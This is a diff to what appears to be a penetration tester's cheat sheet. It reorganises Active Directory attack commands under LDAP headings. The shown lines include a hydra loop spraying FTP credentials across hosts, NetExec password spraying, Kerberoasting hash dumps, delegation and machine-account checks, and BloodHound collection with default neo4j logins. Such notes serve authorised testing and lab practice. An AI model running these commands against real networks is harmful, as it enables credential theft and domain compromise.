@@ -106,14 +106,6 @@ sort -u passwords | tee passwords
 tar -xzvf backup.tar.gz -C .
 unzip backup.zip -d .
 
-## Start bloodhound
-sudo neo4j start
-chromium "http://localhost:7474"
-bloodhound
-neo4j:neo4j
-neo4j:bloodhound
-MATCH (u:User) RETURN u
-
 ## Spray services
 for host in $(cat hosts); do
 (hydra -I ftp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
@@ -574,20 +566,35 @@ sudo nmap -sU -p161 --script "snmp* and not snmp-brute" $TARGET
 snmpwalk -v2c -c COMMUNITY $TARGET | grep 'STRING:'
 
 [*] (389) LDAP
++---------- Domain Information ----------+
 nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
+
++---------- Bloodhound Data ----------+
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
+
+sudo neo4j start
+chromium "http://localhost:7474"
+bloodhound
+neo4j:neo4j
+neo4j:bloodhound
+MATCH (u:User) RETURN u
+
++---------- Domain SID ----------+
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --get-sid
+
++---------- Trusted For Delegation ----------+
+nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success --trusted-for-delegation
+
++---------- Other Attacks ----------+
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success -k
-nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords -M adcs
-nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords -M adcs -k
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M get-desc-users
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --get-sid
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(servicePrincipalName=*)" "cn sAMAccountName servicePrincipalName"
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success --kerberoasting krb5-hashes
-nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success --trusted-for-delegation
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --dc-list --query "(SAMAccountType=805306369)" "SAMAccountName"
 nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=805306369)" "SAMAccountName" | awk '{print $6}' | grep '\$' > machines | sed 's/.$//' | tr '[:upper:]' '[:lower:]' > machines_pw; nxc smb $TARGET -u machines -p machines_pw | grep -oP '\[-\].*TRUST_ACCOUNT.*' | while read line; do echo -e "\e[1;33m$line <--- CHANGE PASSWORD NOW\!\e[0m"; done
 
++---------- Browse with Godap ----------+
 godap $TARGET -u '$USERNAME' -p '$PASSWORD' -d '$DOM'
 
 [*] (445) SMB
